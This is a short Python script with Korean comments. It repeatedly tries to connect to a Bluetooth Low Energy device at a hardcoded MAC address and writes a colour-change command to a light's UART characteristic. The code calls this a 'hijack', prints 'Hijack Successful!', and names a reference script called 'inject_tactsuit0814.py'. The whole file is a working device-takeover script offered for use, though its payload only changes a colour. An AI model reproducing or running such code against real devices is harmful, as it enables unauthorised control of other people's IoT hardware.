#!/usr/bin/env python3

import asyncio
from contextlib import suppress
from bleak import BleakClient, BleakError

# 설정
# 1. 연결할 목표 BLE 장치의 MAC 주소
TARGET_ADDRESS = "D4:D8:F3:B7:68:90"

# 2. 명령을 보낼 Characteristic의 UUID
CHARACTERISTIC_UUID = "6e400002-b5a3-f393-e0a9-e50e24dcca9e"

# 3. 조명에 보낼 색상 변경 명령어
COMMAND = "2"

# 4. 연결 시도 관련 설정 (참고 코드 스타일 적용)
CONNECT_TIMEOUT = 6.0
RETRY_DELAY = 0.8



async def hijack_and_control_light():
    """
    참고 코드(inject_tactsuit0814.py)의 구조를 사용하여,
    지정된 MAC 주소에 계속 연결을 시도하여 명령을 한 번 보냅니다.
    """
    while True:
        # 참고 코드처럼 루프 안에서 매번 BleakClient 객체를 새로 생성합니다.
        client = BleakClient(TARGET_ADDRESS, timeout=CONNECT_TIMEOUT)
        try:
            print(f"\rAttempting to connect to {TARGET_ADDRESS}...", end="")
            await client.connect()

            if not client.is_connected:
                raise ConnectionError("Connection flag is false after connect call.")

            print("\n⚡️ Hijack Successful! Connected to the device.")

            # 단일 명령어 전송
            data_to_send = (COMMAND + "\n").encode()
            await client.write_gatt_char(CHARACTERISTIC_UUID, data_to_send, response=False)
            print(f"Successfully sent command '{COMMAND}'.")
           

            return

        except (BleakError, asyncio.TimeoutError) as e:
            # 연결 실패 시 재시도
            print(f"\rConnection failed: {e}. Retrying in {RETRY_DELAY}s...", end="")
            await asyncio.sleep(RETRY_DELAY)
        except Exception as e:
            # 기타 예외 처리
            print(f"\nAn unexpected error occurred: {repr(e)}")
            await asyncio.sleep(RETRY_DELAY)

        finally:
            # 참고 코드와 동일하게 suppress를 사용하여 안전하게 연결 해제 시도
            # 연결 성공 여부와 관계없이 항상 실
            with suppress(Exception):
                await client.disconnect()

if __name__ == "__main__":
    try:
        asyncio.run(hijack_and_control_light())
    except KeyboardInterrupt:
        print("\nProgram stopped by user.")
